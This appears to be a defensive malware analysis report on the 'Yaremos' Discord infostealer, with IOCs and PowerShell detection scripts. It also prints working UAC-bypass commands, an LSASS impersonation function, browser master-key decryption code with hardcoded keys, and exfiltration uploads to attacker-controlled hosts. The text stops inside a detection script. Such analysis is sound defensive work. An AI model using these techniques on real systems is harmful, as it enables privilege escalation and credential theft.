# ğŸ”´ CRITICAL MALWARE ANALYSIS: Discord Game Installer Infostealer (Yaremos Campaign)

## Executive Summary

**Analysis Date:** February 20, 2026  
**Malware Family:** Multi-Stage Discord-based Information Stealer / RAT  
**Campaign Name:** "Yaremos" Beta Game Malware  
**Attack Vector:** Social Engineering via Discord Direct Message  
**Threat Level:** ğŸ”´ **CRITICAL - ACTIVE CAMPAIGN**  
**Source Thread:** https://www.reddit.com/r/antivirus/comments/1r9kk7l/beta_game_malware_yaremos/

### Key Findings
- **3-stage malware deployment** (JavaScript â†’ JavaScript â†’ Python)
- **16+ browsers targeted** including Chrome, Firefox, Edge, Brave, Opera, Yandex
- **Advanced credential theft** using DPAPI, LSASS impersonation, CNG decryption
- **UAC bypass techniques** with multiple privilege escalation methods
- **Discord client hijacking** for propagation
- **Persistent backdoor** via Task Scheduler, Registry, and file masquerading

---

## ğŸ“Š Complete Attack Chain

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STAGE 1: INITIAL COMPROMISE - Social Engineering                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
[Attacker sends Discord DM from compromised account]
"Hey Mate i'm developing a game can you try it %link%"
                    â†“
[Victim downloads .zip file]
                    â†“
[Extract â†’ Contains malicious .msi installer]
                    â†“
[Victim installs "game" via .msi]
                    â†“
[Installation drops files to %install_location%]
    â€¢ /scripts/crypted.js â†’ resolved.js (51,714 lines - main payload)
    â€¢ /scripts/discord-injection-obf.js â†’ output.js (5,937 lines)
    â€¢ /scripts/Ran_by_resolve.py (1,205 lines - Python decryptor)
    â€¢ Game executable (dropper/launcher)

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STAGE 2: EXECUTION - Multi-Stage Payload Deployment              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
[Victim runs game executable]
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PAYLOAD 1: crypted.js (resolved.js) - Main Infostealer         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    â€¢ Establishes multiple persistence mechanisms
    â€¢ Performs UAC bypass (7 different techniques)
    â€¢ Harvests credentials from 16+ browsers
    â€¢ Steals gaming platform accounts (Discord, Roblox, Steam, TikTok)
    â€¢ Extracts system information (HWID, IP, geolocation)
    â€¢ Launches Python payload for advanced decryption
    â€¢ Exfiltrates data via GoFile and C2 servers
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PAYLOAD 2: discord-injection-obf.js (output.js) - Discord Hijackâ”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    â€¢ Decrypts secondary payload using AES [payload,enc,iv,masterkey]
    â€¢ Hijacks Discord client by injecting into core.asar
    â€¢ Steals Discord tokens and session data
    â€¢ Monitors Discord messages and credentials
    â€¢ Enables password changes without user knowledge
    â€¢ Packages stolen data into .zip for exfiltration
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PAYLOAD 3: Ran_by_resolve.py - Advanced Credential Decryption  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    â€¢ Uses DPAPI to decrypt Chrome/Edge passwords
    â€¢ Impersonates LSASS process for privilege escalation
    â€¢ Decrypts browser master keys using CNG API
    â€¢ Extracts Firefox/Waterfox credentials
    â€¢ Decrypts cookies and autofill data
    â€¢ Harvests credit card information
                    â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ STAGE 3: PERSISTENCE & PROPAGATION                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
[Multiple persistence mechanisms activated simultaneously]
    â€¢ Windows Task Scheduler (hidden, multiple triggers)
    â€¢ Registry Run Keys (HKCU\...\Run)
    â€¢ Startup Folder injection
    â€¢ Discord core.asar modification (permanent Discord hijack)
    â€¢ File masquerading as legitimate Windows processes
    â€¢ UAC bypass for silent privilege escalation
                    â†“
[Malware uses compromised Discord account to spread]
    â†’ Sends DM to victim's contacts with same message
    â†’ Cycle repeats (worm-like propagation)
```

---

## ğŸ¯ Malware Components - Detailed Analysis

### Component 1: crypted.js (resolved.js)
**File:** resolved.js  
**MD5:** `e7daaca7357fff36c7da68e6801a4dfd`  
**Size:** 51,714 lines of heavily obfuscated JavaScript  
**VirusTotal:** https://www.virustotal.com/gui/file/169a23484fb0f903cc8374ec797d72078caabab252b46476579ebdb62b847144  
**Role:** Primary infostealer and system compromiser

#### Key Capabilities:
1. **Persistence Establishment**
2. **UAC Bypass** (7 techniques)
3. **Browser Data Theft** (16+ browsers)
4. **Gaming Platform Credential Theft**
5. **System Information Collection**
6. **Data Exfiltration**

### Component 2: discord-injection-obf.js (output.js)
**File:** output.js  
**MD5:** `1739b4cb315e2e09862c86f508895325`  
**Size:** 5,937 lines of obfuscated JavaScript  
**Role:** Discord client hijacker and propagation engine

#### Key Capabilities:
1. **Discord Client Injection** via core.asar modification
2. **Account Takeover** (token theft, password changes)
3. **Message Monitoring**
4. **Automatic Propagation** via DMs
5. **Session Persistence**

### Component 3: Ran_by_resolve.py
**File:** Ran_by_resolve.py  
**Size:** 1,205 lines of Python  
**Role:** Advanced credential decryption module

#### Key Capabilities:
1. **DPAPI Decryption** for Chrome/Edge
2. **LSASS Impersonation** for privilege escalation
3. **CNG API Decryption** for master keys
4. **Firefox/Waterfox** credential extraction
5. **Multi-encryption Support** (AES, ChaCha20, DES3)

---

## ğŸ”— Network Infrastructure & IOCs

### Command & Control (C2) Servers

| Server | Purpose | Status | VirusTotal |
|--------|---------|--------|-----------|
| `https://network-sync-protocol.net/` | Primary C2 | âš ï¸ ACTIVE | [VT Link](https://www.virustotal.com/gui/url/4611bae71a26c48eba5af9f8ae7ca93151aba86123e6013717b4abfb89c094c0/community) |
| `https://datanetworksync.onrender.com` | Backend server | âš ï¸ ACTIVE | [VT Link](https://www.virustotal.com/gui/url/fea3f44d88eb3c9bebff1b74bb00afeeeac3c5c62d8ff01d2af9276530ac64ac) |
| `https://sync-service.system-telemetry.workers.dev/api/send` | Data exfiltration | âš ï¸ ACTIVE | - |
| `https://funnywebsiteviewer.onrender.com` | Control panel | âš ï¸ ACTIVE | - |

### File Upload Services (Exfiltration)
```
https://store1.gofile.io/uploadFile
https://store2.gofile.io/uploadFile
https://store3.gofile.io/uploadFile
https://store4.gofile.io/uploadFile
https://store5.gofile.io/uploadFile
https://store8.gofile.io/uploadFile
```

### External Services Abused
```
http://ip-api.com/json          (Geolocation)
https://api.ipify.org?format=json  (IP harvesting)
https://www.myexternalip.com/raw   (IP detection)
```

### Gaming Platform APIs Targeted
```
https://api.roblox.com/billing/paymentmethods
https://billing.roblox.com/v1/credit
https://billing.roblox.com/v1/paymentmethods
https://api.steampowered.com/IPlayerService/GetOwnedGames
https://api.steampowered.com/ISteamUser
https://discord.com/api/v9/users/@me
https://webcast.tiktok.com
https://namemc.com (Minecraft accounts)
```

### Additional Malware Files
| File | Hash | VirusTotal |
|------|------|-----------|
| File 1 | c325db8133c1939971a4369d8f1ded74bde8f5488240da5f838ac24d98c37bbf | [VT Link](https://www.virustotal.com/gui/file/c325db8133c1939971a4369d8f1ded74bde8f5488240da5f838ac24d98c37bbf/) |
| File 2 | da3f67f4f79f40d93a18d69993e3041246b48d5545657b4278f88341baa832ad | [VT Link](https://www.virustotal.com/gui/file/da3f67f4f79f40d93a18d69993e3041246b48d5545657b4278f88341baa832ad/) |

---

## ğŸ›¡ï¸ Persistence Mechanisms (7 Methods)

### 1. Discord core.asar Injection âš ï¸ CRITICAL
**Location:** `%LocalAppData%\Discord\app-<version>\modules\discord_desktop_core-<version>\discord_desktop_core\core.asar`  
**Explanation:** https://gist.github.com/vanyle/edbdd0c28a0150af3b905b99a4c48f00

**How it works:**
- Modifies Discord's core application file
- Persists across Discord updates
- Allows malware to monitor all Discord activity
- Enables automatic token theft
- Provides propagation mechanism

**Detection:**
```powershell
# Check core.asar modification date
$discordPath = "$env:LOCALAPPDATA\Discord"
Get-ChildItem -Path $discordPath -Recurse -Filter "core.asar" | 
    Select-Object FullName, LastWriteTime, Length
```

### 2. Windows Task Scheduler (Hidden Tasks)
**Task Name:** Disguised as Microsoft service (e.g., "Microsoft\\Windows\\Application Experience\\ProgramDataUpdater")  
**Triggers:**
- Boot (2-minute delay)
- User logon (30-second delay)
- Every 4 hours
- Session unlock

**Task Configuration:**
```xml
<Task version="1.4">
  <Description>This task gathers and uploads autochk SQM data if opted-in to the Microsoft Customer Experience Improvement Program.</Description>
  <Triggers>
    <BootTrigger><Delay>PT2M</Delay></BootTrigger>
    <LogonTrigger><Delay>PT30S</Delay></LogonTrigger>
    <TimeTrigger><Interval>PT4H</Interval></TimeTrigger>
    <SessionStateChangeTrigger><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger>
  </Triggers>
  <Settings>
    <Hidden>true</Hidden>
    <RunLevel>HighestAvailable</RunLevel>
  </Settings>
</Task>
```

**Detection:**
```powershell
Get-ScheduledTask | Where-Object {
    $_.Settings.Hidden -eq $true -or 
    $_.Description -like "*autochk*" -or
    $_.Description -like "*telemetry*"
} | Select-Object TaskName, State, Hidden, Description
```

### 3. Registry Run Keys
**Locations:**
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

**Detection:**
```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 4. Startup Folder
**Location:** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`

**Detection:**
```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

### 5. File Masquerading as Legitimate Windows Processes
**Location:** `%LOCALAPPDATA%\Microsoft\Windows\SystemCache\`  
**Filenames used:**
- SystemCacheService.exe
- WindowsUpdateCache.exe
- BackgroundTasksHost.exe
- RuntimeBroker.exe
- dwm.exe

**Code from output.js:**
```javascript
const systemDir = path['join'](process['env']['LOCALAPPDATA'], 
    'Microsoft', 'Windows', 'SystemCache');
const legitFileNames = ["SystemCacheService.exe", 
    "WindowsUpdateCache.exe", "BackgroundTasksHost.exe", 
    "RuntimeBroker.exe", "dwm.exe"];
```

**Attributes:** Files are marked as Hidden and System (`attrib +H +S`)

**Detection:**
```powershell
$systemCache = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
if (Test-Path $systemCache) {
    Get-ChildItem $systemCache -Force | 
        Select-Object Name, Attributes, LastWriteTime
}
```

### 6. UAC Bypass Techniques (7 Methods)

#### Method 1: fodhelper.exe Bypass
```cmd
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "malware.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

#### Method 2: eventvwr.exe Bypass
```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "malware.exe" /f
eventvwr.exe
```

#### Method 3: sdclt.exe Bypass (Method A)
```cmd
reg add "HKCU\Software\Classes\Folder\shell\open\command" /ve /t REG_SZ /d "malware.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
sdclt.exe /kickoffelev
```

#### Method 4: sdclt.exe Bypass (Method B)
```cmd
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /ve /t REG_SZ /d "malware.exe" /f
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v IsolatedCommand /t REG_SZ /d "malware.exe" /f
sdclt.exe
```

#### Method 5: SilentCleanup Bypass
```cmd
reg add "HKCU\Environment" /v windir /t REG_SZ /d "malware.exe #" /f
schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup
[restore original windir value]
```

#### Method 6: VBScript Elevation
```vbscript
Set s=CreateObject("Shell.Application")
s.ShellExecute "malware.exe","","","runas",0
```

#### Method 7: LSASS Impersonation (Python Component)
```python
def impersonate_lsass():
    windows.current_process.token.enable_privilege("SeDebugPrivilege")
    proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
    lsass_token = proc.token
    impersonation_token = lsass_token.duplicate(
        type=gdef.TokenImpersonation,
        impersonation_level=gdef.SecurityImpersonation
    )
    windows.current_thread.token = impersonation_token
```

### 7. Python Script Execution for Persistence
The malware ensures Python payload execution by:
- Installing `psutil` if not present
- Running with admin privileges
- Continuously extracting credentials in background

---

## ğŸ¯ Targeted Data & Theft Capabilities

### Browser Credential Theft (16+ Browsers Targeted)

#### Chromium-Based Browsers
| Browser | Data Stolen | Process Killed |
|---------|-------------|----------------|
| Google Chrome | Passwords, Cookies, Credit Cards, Autofill, Tokens | âœ“ |
| Microsoft Edge | Passwords, Cookies, Credit Cards, Autofill, Tokens | âœ“ |
| Brave | Passwords, Cookies, Wallet Data, Tokens | âœ“ |
| Yandex Browser | Passwords, Cookies, Autofill, Tokens | âœ“ |
| Opera | Passwords, Cookies, Credit Cards, Tokens | âœ“ |
| Opera GX | Passwords, Cookies, Credit Cards, Tokens | âœ“ |
| Vivaldi | Passwords, Cookies, Tokens | âœ“ |
| Amigo | Passwords, Cookies | âœ“ |
| Torch | Passwords, Cookies | âœ“ |
| Kometa | Passwords, Cookies | âœ“ |
| Orbitum | Passwords, Cookies | âœ“ |
| CentBrowser | Passwords, Cookies | âœ“ |
| 7Star | Passwords, Cookies | âœ“ |
| Sputnik | Passwords, Cookies | âœ“ |
| Iridium | Passwords, Cookies | âœ“ |
| Epic Privacy Browser | Passwords, Cookies | âœ“ |
| Uran | Passwords, Cookies | âœ“ |
| Chrome SxS | Passwords, Cookies, Tokens | âœ“ |

#### Firefox-Based Browsers
| Browser | Data Stolen | File Accessed |
|---------|-------------|---------------|
| Firefox | Passwords, Logins, Cookies, Session Data | logins.json, signons.sqlite |
| Waterfox | Passwords, Logins, Cookies, Session Data | logins.json, signons.sqlite |

**Browser Data Paths:**
```
%LOCALAPPDATA%\Google\Chrome\User Data
%LOCALAPPDATA%\Microsoft\Edge\User Data
%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data
%LOCALAPPDATA%\Yandex\YandexBrowser\User Data
%APPDATA%\Opera Software\Opera Stable
%APPDATA%\Mozilla\Firefox\Profiles
[... and 10+ more browsers]
```

### Advanced Decryption Techniques (Python Component)

#### Master Key Extraction Methods

**Method 1: Hardcoded AES Key (Flag 1)**
```python
aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
master_key = cipher.decrypt_and_verify(ciphertext, tag)
```

**Method 2: Hardcoded ChaCha20 Key (Flag 2)**
```python
chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
master_key = cipher.decrypt_and_verify(ciphertext, tag)
```

**Method 3: CNG + LSASS Impersonation (Flag 3) - MOST SOPHISTICATED**
```python
xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
# Impersonate LSASS process
with impersonate_lsass():
    decrypted_aes_key = decrypt_with_cng(encrypted_aes_key, key_name)
xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
master_key = cipher.decrypt_and_verify(ciphertext, tag)
```

#### Process Termination Before Theft
The malware kills browser processes to unlock database files:
```python
def kill_browser_if_needed(browser_config):
    subprocess.run(["taskkill", "/F", "/IM", browser_config['process_name']])
    time.sleep(1)
```

### Gaming Platform Credential Theft

#### Discord
**Data Stolen:**
- Username, Avatar, User Badges
- Phone Number (if set)
- Email Address
- Billing Information
- Payment Methods
- IP Address
- MFA Status (enabled/disabled)
- Authentication Tokens
- **CAPABILITY:** Password changer (can change password without user knowing)

**Token Storage Locations:**
```
%APPDATA%\Discord\Local Storage\leveldb
%APPDATA%\discordcanary\Local Storage\leveldb
%APPDATA%\discordptb\Local Storage\leveldb
```

#### Roblox
**Data Stolen:**
- Username & User ID
- .ROBLOSECURITY cookie (session token)
- Account Balance (Robux)
- Premium Status
- Payment Methods
- Purchase History
- Inventory Items

**APIs Accessed:**
```
https://api.roblox.com/billing/paymentmethods
https://billing.roblox.com/v1/credit
https://billing.roblox.com/v1/paymentmethods
https://economy.roblox.com/v1/users/{userId}/currency
https://premiumfeatures.roblox.com/v1/users/{userId}/validate-membership
```

#### Steam
**Data Stolen:**
- Steam API Key
- Account Level
- Game Library (owned games)
- Wallet Balance
- Profile Information
- Trade History

**APIs Accessed:**
```
https://api.steampowered.com/IPlayerService/GetOwnedGames
https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902
https://api.steampowered.com/ISteamUser
```

#### TikTok
**Data Stolen:**
- Session Tokens
- Account Information
- Following/Followers List
- Profile Data

**URLs Accessed:**
```
https://webcast.tiktok.com
https://www.tiktok.com/@{username}
```

#### Minecraft
**Data Stolen:**
- Username & UUID
- Skin Data
- NameMC Profile Information

**Services Accessed:**
```
https://namemc.com/profile/{username}
https://mc-heads.net/avatar/{uuid}
```

### Keyword-Based Credential Filtering

The malware specifically searches for credentials containing these keywords:
```
roblox, steam, epicgames, riotgames, valorant, minecraft, battle.net, 
origin, ubisoft, rockstar, facebook, tiktok, twitter, snapchat, discord, 
reddit, twitch, youtube, google, gmail, netflix, amazon, paypal, stripe, 
microsoft, onedrive, apple, icloud, github, gitlab, onlyfans, fortnite, 
playstation, xbox, nintendo, ea, activision, blizzard
```

This ensures maximum value extraction from stolen credentials.

### System Information Collection

**Data Harvested:**
```javascript
- Hostname (os.hostname())
- Username (process.env.USERNAME)
- External IP Address (ipify.org, myexternalip.com)
- Internal IP Address
- Geolocation (ip-api.com)
- Hardware ID (HWID)
- Operating System Version
- Environment Variables
- Installed Software
- Running Processes
```

### Financial Data Theft

**Credit Card Information:**
- Card Number
- Cardholder Name
- Expiration Date
- CVV (if stored - browser autofill)

**Note from malware author in code:**
```javascript
// "any Credit cards saved. (dont save your credit card it's 12 numbers comeon)"
```

---

## ğŸ“¦ Data Exfiltration Process

### Stage 1: Collection & Packaging
```
1. Browser credentials â†’ Decrypted â†’ Saved to temp files
2. Gaming platform data â†’ API calls â†’ JSON responses saved
3. System info â†’ Gathered â†’ Compiled into report
4. All data â†’ Compressed into .zip archive
```

### Stage 2: Upload to GoFile
```javascript
const gofileServers = [
    'https://store8.gofile.io/uploadFile',
    'https://store1.gofile.io/uploadFile',
    'https://store2.gofile.io/uploadFile',
    'https://store3.gofile.io/uploadFile',
    'https://store4.gofile.io/uploadFile',
    'https://store5.gofile.io/uploadFile'
];
// Retries: 3 attempts per server
// Retry delay: 3000ms
```

### Stage 3: Notification to C2
```
POST to: https://sync-service.system-telemetry.workers.dev/api/send
POST to: https://datanetworksync.onrender.com
POST to: https://network-sync-protocol.net/

Payload includes:
- GoFile download link
- Victim HWID
- System information
- Credential count
- Timestamp
```

### Stage 4: Discord Propagation
```
Using compromised Discord account:
- Sends DMs to all contacts
- Message: "Hey Mate i'm developing a game can you try it %link%"
- Link points to new malware download
- Cycle repeats (worm behavior)
```

---

## ğŸ”¬ Technical Analysis

### Obfuscation Techniques

#### JavaScript Obfuscation (resolved.js, output.js)
```javascript
// Function name randomization
function __p_4714607513() {}
function __p_2431223822__JS_CRITICAL__() {}
function __p_6569810569_c29_CONTROL() {}

// String encoding via character codes
function Return_Char(index_param) {
    // Returns decoded characters from lookup table
}

// Control flow obfuscation
if (__p_8759869191_c29_S3 == __p_6569810569_c29_CONTROL['y'] ? Set : document)

// Variable name obfuscation
var __p_4982174714 = "PHn_T6" in __p_0438593149;
```

#### Encryption Layers
1. **AES Payload Encryption** - Secondary payload encrypted with AES
2. **ChaCha20 Encryption** - Master key encryption
3. **Base64 Encoding** - String obfuscation
4. **Hex Encoding** - Binary data obfuscation

### Encryption Keys Found

**Hardcoded Keys (CRITICAL - Can be used for decryption):**

```python
# AES Key (Flag 1)
AES_KEY = "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"

# ChaCha20 Key (Flag 2)
CHACHA20_KEY = "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"

# XOR Key (Flag 3)
XOR_KEY = "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
```

These hardcoded keys represent a **major security flaw** in the malware and can be used by defenders to:
- Decrypt captured network traffic
- Reverse engineer additional payloads
- Identify related malware samples

---

## ğŸš¨ Detection & Remediation

### Immediate Detection Commands

#### 1. Check for Discord core.asar Modification âš ï¸ CRITICAL
```powershell
# PowerShell - Check all Discord installations
$discordPaths = @(
    "$env:LOCALAPPDATA\Discord",
    "$env:LOCALAPPDATA\DiscordCanary",
    "$env:LOCALAPPDATA\DiscordPTB"
)

foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Write-Host "`n[*] Checking: $path" -ForegroundColor Cyan
        Get-ChildItem -Path $path -Recurse -Filter "core.asar" -ErrorAction SilentlyContinue | 
            ForEach-Object {
                $file = $_
                $age = (Get-Date) - $file.LastWriteTime
                $color = if ($age.TotalDays -lt 7) { "Red" } else { "Yellow" }
                
                Write-Host "    File: $($file.FullName)" -ForegroundColor $color
                Write-Host "    Modified: $($file.LastWriteTime)" -ForegroundColor $color
                Write-Host "    Size: $($file.Length) bytes" -ForegroundColor $color
                
                if ($age.TotalDays -lt 7) {
                    Write-Host "    [!] SUSPICIOUS - Modified in last 7 days!" -ForegroundColor Red
                }
            }
    }
}
```

#### 2. Check for Malicious Scheduled Tasks
```powershell
# Find hidden or suspicious tasks
Get-ScheduledTask | Where-Object {
    $_.Settings.Hidden -eq $true -or 
    $_.Description -like "*autochk*" -or
    $_.Description -like "*telemetry*" -or
    $_.Description -like "*sync*" -or
    $_.TaskName -like "*update*"
} | Select-Object TaskName, State, @{N='Hidden';E={$_.Settings.Hidden}}, Description, 
    @{N='Actions';E={($_.Actions | Select-Object -ExpandProperty Execute) -join ", "}} | 
    Format-Table -AutoSize
```

#### 3. Check for File Masquerading
```powershell
# Check for malware hiding as Windows processes
$systemCache = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
if (Test-Path $systemCache) {
    Write-Host "[!] ALERT: SystemCache folder exists (SUSPICIOUS)" -ForegroundColor Red
    Get-ChildItem $systemCache -Force -ErrorAction SilentlyContinue | 
        Select-Object Name, Attributes, Length, LastWriteTime, CreationTime
} else {
    Write-Host "[+] SystemCache folder does not exist (Good)" -ForegroundColor Green
}
```

#### 4. Check Registry Run Keys
```powershell
# Comprehensive registry check
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        Write-Host "`n[*] Checking: $key" -ForegroundColor Cyan
        $values = Get-ItemProperty $key -ErrorAction SilentlyContinue
        $values.PSObject.Properties | Where-Object {
            $_.Name -notmatch "PS" -and $_.Value -ne $null
        } | ForEach-Object {
            Write-Host "    $($_.Name) = $($_.Value)" -ForegroundColor Yellow
        }
    }
}
```

#### 5. Check for UAC Bypass Registry Keys
```powershell
# Check for UAC bypass artifacts
$uacBypassKeys = @(
    "HKCU:\Software\Classes\ms-settings\shell\open\command",
    "HKCU:\Software\Classes\mscfile\shell\open\command",
    "HKCU:\Software\Classes\Folder\shell\open\command",
    "HKCU:\Software\Classes\exefile\shell\runas\command"
)

foreach ($key in $uacBypassKeys) {
    if (Test-Path $key) {
        Write-Host "[!] UAC Bypass key found: $key" -ForegroundColor Red
        Get-ItemProperty $key | Select-Object * -ExcludeProperty PS*
    }
}
```

#### 6. Check for Suspicious Processes
```powershell
# Check for Node.js/Python processes running from suspicious locations
Get-Process | Where-Object {
    ($_.ProcessName -like "*node*" -or 
     $_.ProcessName -like "*python*" -or
     $_.ProcessName -like "*powershell*") -and
    ($_.Path -like "*AppData*" -or 
     $_.Path -like "*Temp*" -or
     $_.Path -like "*SystemCache*")
} | Select-Object ProcessName, Id, Path, StartTime | Format-Table -AutoSize
```

#### 7. Check Network Connections to C2
```powershell
# Check for active C2 connections
$c2Domains = @(
    "network-sync-protocol.net",
    "datanetworksync.onrender.com",
    "sync-service.system-telemetry.workers.dev",
    "funnywebsiteviewer.onrender.com",
    "gofile.io"
)

$netstat = netstat -ano | Out-String

foreach ($domain in $c2Domains) {
    if ($netstat -match $domain) {
        Write-Host "[!] ACTIVE CONNECTION to C2: $domain" -ForegroundColor Red
    }
}
```

### Complete Detection Script

Save and run this comprehensive detection script:

```powershell
# Save as: Detect-Yaremosmalware.ps1
# Run as Administrator

Write-Host "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" -ForegroundColor Red
Write-Host "â•‘  Yaremos Malware Detection Script - Complete System Scan    â•‘" -ForegroundColor Red
